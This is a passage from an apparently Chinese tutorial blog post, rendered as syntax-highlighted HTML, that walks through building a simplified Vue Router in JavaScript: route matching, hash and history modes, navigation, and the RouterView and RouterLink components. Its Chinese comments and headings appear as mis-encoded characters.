        <span class="hljs-attr">meta</span>: route.<span class="hljs-property">meta</span> || {}
      }
      
      <span class="hljs-comment">// å­˜å‚¨è·¯ç”±è®°å½•</span>
      <span class="hljs-keyword">const</span> normalizedPath = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">normalizePath</span>(record.<span class="hljs-property">path</span>)
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">routeMap</span>[normalizedPath] = record
      
      <span class="hljs-comment">// é€’å½’å¤„ç†åµŒå¥—è·¯ç”±</span>
      <span class="hljs-keyword">if</span> (route.<span class="hljs-property">children</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createRouteMap</span>(route.<span class="hljs-property">children</span>, record.<span class="hljs-property">path</span> + <span class="hljs-string">'/'</span>)
      }
    })
  }
  
  <span class="hljs-title function_">normalizePath</span>(<span class="hljs-params">path</span>) {
    <span class="hljs-comment">// å¤„ç†è·¯å¾„æ ¼å¼ï¼šç¡®ä¿ä»¥/å¼€å¤´ï¼Œä¸ä»¥/ç»“å°¾ï¼ˆé™¤äº†æ ¹è·¯å¾„ï¼‰</span>
    <span class="hljs-keyword">let</span> normalized = path.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\/+$/</span>, <span class="hljs-string">''</span>) || <span class="hljs-string">'/'</span>
    <span class="hljs-keyword">if</span> (!normalized.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/'</span>)) {
      normalized = <span class="hljs-string">'/'</span> + normalized
    }
    <span class="hljs-keyword">return</span> normalized
  }
}
</code></pre>
<h3 data-id="heading-9">3.2 å®ç°è·¯ç”±æ¨¡å¼</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VueRouter</span> {
  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">mode</span> === <span class="hljs-string">'history'</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initHistoryMode</span>()
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initHashMode</span>()
    }
  }
  
  <span class="hljs-title function_">initHashMode</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// ç¡®ä¿hashä»¥/#/å¼€å¤´</span>
    <span class="hljs-keyword">if</span> (!location.<span class="hljs-property">hash</span>) {
      location.<span class="hljs-property">hash</span> = <span class="hljs-string">'/'</span>
    }
    
    <span class="hljs-comment">// åˆå§‹åŠ è½½</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">transitionTo</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getHash</span>())
    })
    
    <span class="hljs-comment">// ç›‘å¬hashå˜åŒ–</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'hashchange'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">transitionTo</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getHash</span>())
    })
  }
  
  <span class="hljs-title function_">initHistoryMode</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// åˆå§‹åŠ è½½</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">transitionTo</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getPath</span>())
    })
    
    <span class="hljs-comment">// ç›‘å¬popstateäº‹ä»¶ï¼ˆæµè§ˆå™¨å‰è¿›åé€€ï¼‰</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'popstate'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">transitionTo</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getPath</span>())
    })
  }
  
  <span class="hljs-title function_">getHash</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> hash = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">return</span> hash || <span class="hljs-string">'/'</span>
  }
  
  <span class="hljs-title function_">getPath</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> path = location.<span class="hljs-property">pathname</span> + location.<span class="hljs-property">search</span>
    <span class="hljs-keyword">return</span> path || <span class="hljs-string">'/'</span>
  }
}
</code></pre>
<h3 data-id="heading-10">3.3 å®ç°è·¯ç”±åŒ¹é…ç®—æ³•</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VueRouter</span> {
  <span class="hljs-title function_">match</span>(<span class="hljs-params">path</span>) {
    <span class="hljs-keyword">const</span> matched = []
    <span class="hljs-keyword">const</span> params = {}
    
    <span class="hljs-comment">// æŸ¥æ‰¾åŒ¹é…çš„è·¯ç”±è®°å½•</span>
    <span class="hljs-keyword">let</span> routeRecord = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">findRouteRecord</span>(path)
    
    <span class="hljs-comment">// æ”¶é›†æ‰€æœ‰åŒ¹é…çš„è·¯ç”±è®°å½•ï¼ˆåŒ…æ‹¬çˆ¶è·¯ç”±ï¼‰</span>
    <span class="hljs-keyword">while</span> (routeRecord) {
      matched.<span class="hljs-title function_">unshift</span>(routeRecord)
      routeRecord = <span class="hljs-variable language_">this</span>.<span class="hljs-property">routeMap</span>[routeRecord.<span class="hljs-property">parent</span>] || <span class="hljs-literal">null</span>
    }
    
    <span class="hljs-comment">// è§£æè·¯å¾„å‚æ•°ï¼ˆåŠ¨æ€è·¯ç”±ï¼‰</span>
    <span class="hljs-keyword">if</span> (path.<span class="hljs-title function_">includes</span>(<span class="hljs-string">':'</span>)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">extractParams</span>(path, matched[matched.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>], params)
    }
    
    <span class="hljs-comment">// è§£ææŸ¥è¯¢å‚æ•°</span>
    <span class="hljs-keyword">const</span> query = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">extractQuery</span>(path)
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">path</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">normalizePath</span>(path.<span class="hljs-title function_">split</span>(<span class="hljs-string">'?'</span>)[<span class="hljs-number">0</span>]),
      <span class="hljs-attr">fullPath</span>: path,
      matched,
      params,
      query
    }
  }
  
  <span class="hljs-title function_">findRouteRecord</span>(<span class="hljs-params">path</span>) {
    <span class="hljs-keyword">const</span> pathWithoutQuery = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">'?'</span>)[<span class="hljs-number">0</span>]
    <span class="hljs-keyword">const</span> normalizedPath = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">normalizePath</span>(pathWithoutQuery)
    
    <span class="hljs-comment">// ç²¾ç¡®åŒ¹é…</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">routeMap</span>[normalizedPath]) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">routeMap</span>[normalizedPath]
    }
    
    <span class="hljs-comment">// åŠ¨æ€è·¯ç”±åŒ¹é…ï¼ˆå¦‚ /user/:idï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> routePath <span class="hljs-keyword">in</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">routeMap</span>) {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isDynamicRoute</span>(routePath)) {
        <span class="hljs-keyword">const</span> pattern = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">pathToRegexp</span>(routePath)
        <span class="hljs-keyword">if</span> (pattern.<span class="hljs-title function_">test</span>(normalizedPath)) {
          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">routeMap</span>[routePath]
        }
      }
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
  }
  
  <span class="hljs-title function_">isDynamicRoute</span>(<span class="hljs-params">path</span>) {
    <span class="hljs-keyword">return</span> path.<span class="hljs-title function_">includes</span>(<span class="hljs-string">':'</span>)
  }
  
  <span class="hljs-title function_">pathToRegexp</span>(<span class="hljs-params">path</span>) {
    <span class="hljs-comment">// å°†è·¯å¾„æ¨¡å¼è½¬æ¢ä¸ºæ­£åˆ™è¡¨è¾¾å¼</span>
    <span class="hljs-keyword">const</span> keys = []
    <span class="hljs-keyword">const</span> pattern = path
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\/:(\w+)/g</span>, <span class="hljs-function">(<span class="hljs-params">_, key</span>) =&gt;</span> {
        keys.<span class="hljs-title function_">push</span>(key)
        <span class="hljs-keyword">return</span> <span class="hljs-string">'/([^/]+)'</span>
      })
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">'\\/'</span>)
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">`^<span class="hljs-subst">${pattern}</span>$`</span>)
  }
  
  <span class="hljs-title function_">extractParams</span>(<span class="hljs-params">path, routeRecord, params</span>) {
    <span class="hljs-keyword">const</span> pathParts = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">'/'</span>)
    <span class="hljs-keyword">const</span> routeParts = routeRecord.<span class="hljs-property">path</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'/'</span>)
    
    routeParts.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">part, index</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (part.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">':'</span>)) {
        <span class="hljs-keyword">const</span> key = part.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>)
        params[key] = pathParts[index] || <span class="hljs-string">''</span>
      }
    })
  }
  
  <span class="hljs-title function_">extractQuery</span>(<span class="hljs-params">path</span>) {
    <span class="hljs-keyword">const</span> query = {}
    <span class="hljs-keyword">const</span> queryString = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">'?'</span>)[<span class="hljs-number">1</span>]
    
    <span class="hljs-keyword">if</span> (queryString) {
      queryString.<span class="hljs-title function_">split</span>(<span class="hljs-string">'&amp;'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">pair</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> [key, value] = pair.<span class="hljs-title function_">split</span>(<span class="hljs-string">'='</span>)
        <span class="hljs-keyword">if</span> (key) {
          query[<span class="hljs-built_in">decodeURIComponent</span>(key)] = <span class="hljs-built_in">decodeURIComponent</span>(value || <span class="hljs-string">''</span>)
        }
      })
    }
    
    <span class="hljs-keyword">return</span> query
  }
}
</code></pre>
<h3 data-id="heading-11">3.4 å®ç°è·¯ç”±å¯¼èˆª</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VueRouter</span> {
  <span class="hljs-title function_">transitionTo</span>(<span class="hljs-params">path, onComplete</span>) {
    <span class="hljs-keyword">const</span> route = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">match</span>(path)
    
    <span class="hljs-comment">// å¯¼èˆªå®ˆå«ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
    <span class="hljs-keyword">const</span> guards = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">runQueue</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">beforeHooks</span>, route)
    
    guards.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// æ›´æ–°å½“å‰è·¯ç”±</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = route
      
      <span class="hljs-comment">// è§¦å‘è·¯ç”±å˜åŒ–</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">cb</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">cb</span>(route)
      
      <span class="hljs-comment">// æ›´æ–°URL</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensureURL</span>()
      
      <span class="hljs-comment">// å®Œæˆå›è°ƒ</span>
      onComplete &amp;&amp; <span class="hljs-title function_">onComplete</span>()
    }).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// å¯¼èˆªå–æ¶ˆ</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Navigation cancelled'</span>)
    })
  }
  
  <span class="hljs-title function_">push</span>(<span class="hljs-params">location</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">mode</span> === <span class="hljs-string">'history'</span>) {
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">pushState</span>({}, <span class="hljs-string">''</span>, location)
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">transitionTo</span>(location)
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hash</span> = location
    }
  }
  
  <span class="hljs-title function_">replace</span>(<span class="hljs-params">location</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">mode</span> === <span class="hljs-string">'history'</span>) {
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">replaceState</span>({}, <span class="hljs-string">''</span>, location)
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">transitionTo</span>(location)
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">const</span> hash = location.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'#'</span>) ? location : <span class="hljs-string">'#'</span> + location
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">replace</span>(
        <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span> + <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span> + hash
      )
    }
  }
  
  <span class="hljs-title function_">go</span>(<span class="hljs-params">n</span>) {
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">go</span>(n)
  }
  
  <span class="hljs-title function_">back</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">go</span>(-<span class="hljs-number">1</span>)
  }
  
  <span class="hljs-title function_">forward</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">go</span>(<span class="hljs-number">1</span>)
  }
  
  <span class="hljs-title function_">ensureURL</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">mode</span> === <span class="hljs-string">'history'</span>) {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span> !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span>.<span class="hljs-property">path</span>) {
        <span class="hljs-variable language_">window</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">replaceState</span>({}, <span class="hljs-string">''</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span>.<span class="hljs-property">fullPath</span>)
      }
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">const</span> currentHash = <span class="hljs-string">'#'</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span>.<span class="hljs-property">path</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hash</span> !== currentHash) {
        <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">replace</span>(
          <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span> + <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span> + currentHash
        )
      }
    }
  }
}
</code></pre>
<h3 data-id="heading-12">3.5 å®ç°RouterViewç»„ä»¶</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// RouterViewç»„ä»¶å®ç°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">RouterView</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'RouterView'</span>,
  <span class="hljs-attr">functional</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-title function_">render</span>(<span class="hljs-params">_, { props, children, parent, data }</span>) {
    <span class="hljs-comment">// æ ‡è®°ä¸ºè·¯ç”±ç»„ä»¶</span>
    data.<span class="hljs-property">routerView</span> = <span class="hljs-literal">true</span>
    
    <span class="hljs-comment">// è·å–å½“å‰è·¯ç”±åŒ¹é…çš„ç»„ä»¶</span>
    <span class="hljs-keyword">const</span> route = parent.<span class="hljs-property">$route</span>
    <span class="hljs-keyword">const</span> matchedComponents = route.<span class="hljs-property">matched</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">record</span> =&gt;</span> record.<span class="hljs-property">component</span>)
    
    <span class="hljs-comment">// è®¡ç®—å½“å‰æ¸²æŸ“æ·±åº¦ï¼ˆå¤„ç†åµŒå¥—è·¯ç”±ï¼‰</span>
    <span class="hljs-keyword">let</span> depth = <span class="hljs-number">0</span>
    <span class="hljs-keyword">let</span> parentNode = parent
    <span class="hljs-keyword">while</span> (parentNode &amp;&amp; parentNode !== parent.<span class="hljs-property">$root</span>) {
      <span class="hljs-keyword">if</span> (parentNode.<span class="hljs-property">$vnode</span> &amp;&amp; parentNode.<span class="hljs-property">$vnode</span>.<span class="hljs-property">data</span>.<span class="hljs-property">routerView</span>) {
        depth++
      }
      parentNode = parentNode.<span class="hljs-property">$parent</span>
    }
    
    <span class="hljs-comment">// è·å–å¯¹åº”å±‚çº§çš„ç»„ä»¶</span>
    <span class="hljs-keyword">const</span> component = matchedComponents[depth]
    
    <span class="hljs-keyword">if</span> (!component) {
      <span class="hljs-keyword">return</span> children || []
    }
    
    <span class="hljs-comment">// æ¸²æŸ“ç»„ä»¶</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">createElement</span>(component, data)
  }
}
</code></pre>
<h3 data-id="heading-13">3.6 å®ç°RouterLinkç»„ä»¶</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// RouterLinkç»„ä»¶å®ç°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">RouterLink</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'RouterLink'</span>,
  <span class="hljs-attr">props</span>: {
    <span class="hljs-attr">to</span>: {
      <span class="hljs-attr">type</span>: [<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>],
      <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>
    },
    <span class="hljs-attr">tag</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
      <span class="hljs-attr">default</span>: <span class="hljs-string">'a'</span>
    },
    <span class="hljs-attr">exact</span>: <span class="hljs-title class_">Boolean</span>,
    <span class="hljs-attr">activeClass</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
      <span class="hljs-attr">default</span>: <span class="hljs-string">'router-link-active'</span>
    },
    <span class="hljs-attr">exactActiveClass</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
      <span class="hljs-attr">default</span>: <span class="hljs-string">'router-link-exact-active'</span>
    },
    <span class="hljs-attr">replace</span>: <span class="hljs-title class_">Boolean</span>
  },
  <span class="hljs-title function_">render</span>(<span class="hljs-params">h</span>) {
    <span class="hljs-comment">// è§£æç›®æ ‡è·¯ç”±</span>
    <span class="hljs-keyword">const</span> router = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>
    <span class="hljs-keyword">const</span> current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$route</span>
    <span class="hljs-keyword">const</span> { location, route } = router.<span class="hljs-title function_">resolve</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span>, current)
    
    <span class="hljs-comment">// ç”Ÿæˆhref</span>
    <span class="hljs-keyword">const</span> href = router.<span class="hljs-property">options</span>.<span class="hljs-property">mode</span> === <span class="hljs-string">'hash'</span> 
      ? <span class="hljs-string">'#'</span> + route.<span class="hljs-property">fullPath</span> 
      : route.<span class="hljs-property">fullPath</span>
    
    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æ¿€æ´»</span>
    <span class="hljs-keyword">const</span> isExact = current.<span class="hljs-property">path</span> === route.<span class="hljs-property">path</span>
    <span class="hljs-keyword">const</span> isActive = <span class="hljs-variable language_">this</span>.<span class="hljs-property">exact</span> ? isExact : current.<span class="hljs-property">path</span>.<span class="hljs-title function_">startsWith</span>(route.<span class="hljs-property">path</span>)
    
    <span class="hljs-comment">// ç±»åå¤„ç†</span>
    <span class="hljs-keyword">const</span> classObj = {}
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">activeClass</span>) {
      classObj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">activeClass</span>] = isActive
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">exactActiveClass</span>) {
      classObj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">exactActiveClass</span>] = isExact
    }
    
    <span class="hljs-comment">// ç‚¹å‡»å¤„ç†</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = e =&gt; {
      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">metaKey</span> || e.<span class="hljs-property">ctrlKey</span> || e.<span class="hljs-property">shiftKey</span>) <span class="hljs-keyword">return</span>
      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">defaultPrevented</span>) <span class="hljs-keyword">return</span>
      e.<span class="hljs-title function_">preventDefault</span>()
      
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">replace</span>) {
        router.<span class="hljs-title function_">replace</span>(location)
      } <span class="hljs-keyword">else</span> {
        router.<span class="hljs-title function_">push</span>(location)
      }
    }
    
    <span class="hljs-comment">// åˆ›å»ºå­å…ƒç´ </span>
    <span class="hljs-keyword">const</span> children = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$slots</span>.<span class="hljs-property">default</span> || [<span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span>]
    
    <span class="hljs-keyword">const</span> data = {
      <span class="hljs-attr">class</span>: classObj,
      <span class="hljs-attr">attrs</span>: {
        href
      },
      <span class="hljs-attr">on</span>: {
        <span class="hljs-attr">click</span>: handler
      }
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">h</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">tag</span>, data, children)
  }
}
</code></pre>
<h3 data-id="heading-14">3.7 Vueæ’ä»¶é›†æˆ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vueæ’ä»¶å®‰è£…</span>
<span class="hljs-title class_">VueRouter</span>.<span class="hljs-property">install</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">Vue</span>) {
  <span class="hljs-comment">// æ··å…¥$routerå’Œ$route</span>
  <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">mixin</span>({
    <span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">$options</span>.<span class="hljs-property">router</span>) {
        <span class="hljs-comment">// æ ¹å®ä¾‹</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">_routerRoot</span> = <span class="hljs-variable language_">this</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">_router</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$options</span>.<span class="hljs-property">router</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">_router</span>.<span class="hljs-title function_">init</span>(<span class="hljs-variable language_">this</span>)
        
        <span class="hljs-comment">// å“åº”å¼å®šä¹‰$route</span>
        <span class="hljs-title class_">Vue</span>.<span class="hljs-property">util</span>.<span class="hljs-title function_">defineReactive</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-string">'_route'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">_router</span>.<span class="hljs-property">current</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å­ç»„ä»¶</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">_routerRoot</span> = (<span class="hljs-variable language_">this</span>.<span class="hljs-property">$parent</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">$parent</span>.<span class="hljs-property">_routerRoot</span>) || <span class="hljs-variable language_">this</span>
      }
    }
  })
  
  <span class="hljs-comment">// å®šä¹‰$routerå’Œ$routeå±æ€§</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Vue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">'$router'</span>, {
    <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_routerRoot</span>.<span class="hljs-property">_router</span>
    }
  })
  
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Vue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">'$route'</span>, {
    <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_routerRoot</span>.<span class="hljs-property">_route</span>
    }
  })
  
  <span class="hljs-comment">// æ³¨å†Œå…¨å±€ç»„ä»¶</span>
  <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">'RouterView'</span>, <span class="hljs-title class_">RouterView</span>)
  <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">'RouterLink'</span>, <span class="hljs-title class_">RouterLink</span>)
}
</code></pre>
<h2 data-id="heading-15">å››ã€ä½¿ç”¨ç¤ºä¾‹</h2>
<h3 data-id="heading-16">4.1 åŸºæœ¬ä½¿ç”¨</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. å®šä¹‰è·¯ç”±ç»„ä»¶</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Home</span> = { <span class="hljs-attr">template</span>: <span class="hljs-string">'&lt;div&gt;Home Page&lt;/div&gt;'</span> }
<span class="hljs-keyword">const</span> <span class="hljs-title class_">About</span> = { <span class="hljs-attr">template</span>: <span class="hljs-string">'&lt;div&gt;About Page&lt;/div&gt;'</span> }
<span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = { 
  <span class="hljs-attr">template</span>: <span class="hljs-string">`
    &lt;div&gt;
      &lt;h2&gt;User {{ $route.params.id }}&lt;/h2&gt;
      &lt;router-view&gt;&lt;/router-view&gt;
    &lt;/div&gt;
  `</span>
}
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Profile</span> = { <span class="hljs-attr">template</span>: <span class="hljs-string">'&lt;div&gt;User Profile&lt;/div&gt;'</span> }

<span class="hljs-comment">// 2. åˆ›å»ºè·¯ç”±å®ä¾‹</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>({
  <span class="hljs-attr">mode</span>: <span class="hljs-string">'history'</span>,
  <span class="hljs-attr">routes</span>: [
    { <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span> },
    { <span class="hljs-attr">path</span>: <span class="hljs-string">'/about'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">About</span> },
    { 
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/:id'</span>, 
      <span class="hljs-attr">component</span>: <span class="hljs-title class_">User</span>,
      <span class="hljs-attr">children</span>: [
        { <span class="hljs-attr">path</span>: <span class="hljs-string">'profile'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Profile</span> }
      ]
    }
  ]
})

<span class="hljs-comment">// 3. åˆ›å»ºVueå®ä¾‹</span>
<span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
  router,
  <span class="hljs-attr">template</span>: <span class="hljs-string">`
    &lt;div id="app"&gt;
      &lt;nav&gt;
        &lt;router-link to="/"&gt;Home&lt;/router-link&gt;
        &lt;router-link to="/about"&gt;About&lt;/router-link&gt;
        &lt;router-link to="/user/123"&gt;User 123&lt;/router-link&gt;
      &lt;/nav&gt;
      &lt;router-view&gt;&lt;/router-view&gt;
    &lt;/div&gt;
  `</span>
}).$mount(<span class="hljs-string">'#app'</span>)
</code></pre>
<h3 data-id="heading-17">4.2 å¯¼èˆªå®ˆå«ç¤ºä¾‹</h3>
